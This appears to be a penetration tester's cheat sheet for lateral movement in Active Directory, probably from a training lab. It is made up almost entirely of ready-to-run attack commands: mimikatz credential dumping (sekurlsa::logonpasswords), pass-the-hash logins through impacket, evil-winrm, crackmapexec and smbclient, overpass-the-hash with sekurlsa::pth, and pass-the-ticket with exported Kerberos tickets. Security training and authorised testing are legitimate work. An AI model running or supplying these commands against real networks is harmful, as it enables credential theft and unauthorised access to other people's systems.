# these are the use cases and their respective commands for lateral movement in AD
#
# Local Admin on the target machine:
# 	- WMI
# 	- WinRM		--> can also work if you are Remote Management Users on target
# 	- PsExec
# 	- DCOM
#
# Local Admin on the local machine, not the remote machine:
# 	- Pass the Hash
# 	- Overpass the Hash
# 	- Pass the Ticket


# Pass the Hash

privilege::debug
sekurlsa::logonpasswords
impacket-smbexec -hashes 00000000000000000000000000000000:<nt-hash> Administrator@<victim-IP>
impacket-psexec -hashes 00000000000000000000000000000000:<nt-hash> Administrator@<victim-IP>
impacket-wmiexec -hashes 00000000000000000000000000000000:<nt-hash> Administrator@<victim-IP>
evil-winrm -H 08d7a47a6f9f66b97b1bae4178747494 -u dave -i 192.168.197.72
crackmapexec smb 192.168.197.72 -u dave -H 08d7a47a6f9f66b97b1bae4178747494 -d corp.com
smbclient //192.168.197.72/backup -U dave --pw-nt-hash 08d7a47a6f9f66b97b1bae4178747494 -W corp.com


# Overpass the Hash

sekurlsa::logonpasswords
sekurlsa::pth /user:<user> /domain:domain.local /ntlm:<nt-hash> /run:powershell
klist
net use \\DC1\C$
klist
.\PsExec.exe \\<victim-hostname>\C$


# Pass the Ticket

sekurlsa::tickets /export
# select an exported .kirbi ticket based on the target user and target service
kerberos::ptt <ticket.kirbi>
klist
ls \\FILES04\C$
net view \\WEB04
pushd \\WEB04\backup



